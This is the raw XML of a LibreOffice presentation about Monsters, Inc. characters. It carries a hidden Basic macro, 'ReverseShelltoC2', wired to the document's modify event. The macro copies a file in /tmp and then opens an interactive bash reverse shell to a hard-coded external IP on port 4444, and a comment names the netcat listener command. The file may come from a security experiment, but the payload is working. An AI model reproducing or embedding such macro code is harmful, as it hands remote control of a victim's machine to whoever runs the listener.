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7000002D06C617BC2.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002DA00000399F83FBB70.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000012C0000010FF6C3C06C.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000105000002CEBDEA46B6.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000003E8000004E6C05DEAFF.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000273000001DD54AEF6C7.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000001000000DC000000EB9B3115DE.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000124000001494E8B9E52.png" manifest:media-type="image/png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office:modify-changed" xlink:href="vnd.sun.star.script:Standard.Module1.ReverseShelltoC2?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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134cm, 0cm, 5.104cm)" draw:image-opacity="100%" style:mirror="none" loext:decorative="false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fo:min-height="10.501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Midnightblue-title">
      <style:graphic-properties fo:min-height="1.998cm" loext:decorative="false"/>
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="pr8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Midnightblue2-title">
      <style:graphic-properties fo:min-height="5.75cm" loext:decorative="false"/>
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="pr10" style:family="presentation" style:parent-style-name="Midnightblue2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775cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>Monster’s Inc Characters</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:text-style-name="P1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3">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="26cm" svg:height="1.997cm" svg:x="0.9cm" svg:y="0.627cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>The Main Characters</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="12.687cm" svg:height="10.5cm" svg:x="1cm" svg:y="4.125cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Mike Wazowski</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="12.687cm" svg:height="10.5cm" svg:x="14.322cm" svg:y="4.125cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>James P. Sullivan</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="7.725cm" svg:height="8.704cm" svg:x="17.04cm" svg:y="5.715cm">
          <draw:image xlink:href="Pictures/1000000000000124000001494E8B9E52.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="7.62cm" svg:height="8.14cm" svg:x="1.905cm" svg:y="5.715cm">
          <draw:image xlink:href="Pictures/10000001000000DC000000EB9B3115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3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Antagonist</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="12.687cm" svg:height="10.5cm" svg:x="8.255cm" svg:y="3.81cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Randal Boggs</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="7.612cm" svg:height="9.546cm" svg:x="9.525cm" svg:y="5.08cm">
          <draw:image xlink:href="Pictures/10000001000003E8000004E6C05DEA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2" presentation:presentation-page-layout-name="AL3T1">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <draw:frame presentation:style-name="pr9" draw:layer="layout" svg:width="13cm" svg:height="4.5cm" svg:x="7.5cm" svg:y="4cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>Background Characters</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="5.624cm" svg:height="5.08cm" svg:x="19.685cm" svg:y="9.525cm">
          <draw:image xlink:href="Pictures/100000000000012C0000010FF6C3C06C.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr3" draw:text-style-name="P2" draw:layer="layout" svg:width="4.432cm" svg:height="8.81cm" svg:x="0.648cm" svg:y="0.635cm">
          <draw:image xlink:href="Pictures/1000000000000273000001DD54AEF6C7.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="5.537cm" svg:height="6.985cm" svg:x="21.768cm" svg:y="1.27cm">
          <draw:image xlink:href="Pictures/10000000000002DA00000399F83FBB70.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="1.846cm" svg:height="5.079cm" svg:x="14.664cm" svg:y="9.526cm">
          <draw:image xlink:href="Pictures/1000000000000105000002CEBDEA46B6.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="4.113cm" svg:height="5.08cm" svg:x="4.445cm" svg:y="10.16cm">
          <draw:image xlink:href="Pictures/1000000000000247000002D06C617BC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20:10:58.148152997</meta:creation-date>
    <meta:editing-duration>PT16M6S</meta:editing-duration>
    <meta:editing-cycles>10</meta:editing-cycles>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
    <dc:title>Midnightblue</dc:title>
    <dc:date>2025-04-12T20:00:24.189688526</dc:date>
    <meta:document-statistic meta:object-count="7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'Remote Connection

'Setup
'Will open console connecting to script executor
'Run listner on server
'nc -lvnp 4444 
Sub CopyCalls
  Dim fileAccess As Object
  Dim sourceFile As String
  Dim destinationFile As String

  sourceFile = "/tmp/zpoline_syscalls.csv"
  destinationFile = "/tmp/zpoline_B4_syscalls.csv"

  fileAccess = CreateUnoService("com.sun.star.ucb.SimpleFileAccess")
  fileAccess.copy(sourceFile, destinationFile)
End Sub


Sub ReverseShelltoC2
	'IP/PORT of the listner where the console will open
	CopyCalls
	Shell("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/165.227.221.46/4444 0&gt;&amp;1'", 0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